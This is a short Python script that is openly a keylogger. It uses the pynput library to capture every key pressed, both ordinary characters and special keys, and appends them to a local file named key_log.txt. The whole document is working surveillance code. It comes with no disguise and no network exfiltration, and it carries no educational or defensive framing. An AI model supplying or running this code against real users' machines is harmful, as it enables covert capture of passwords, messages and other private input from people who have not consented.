from pynput.keyboard import Listener

# File where we'll store the logged keystrokes
log_file = "key_log.txt"

def log_keystroke(key):
    try:
        # Append the key pressed to the log file
        with open(log_file, "a") as f:
            f.write(str(key.char))  # Normal key (a, b, c, etc.)
    except AttributeError:
        # Special keys (space, enter, shift, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{str(key)}]")  # Logs special keys in square brackets

# Function to start the listener
def start_keylogger():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
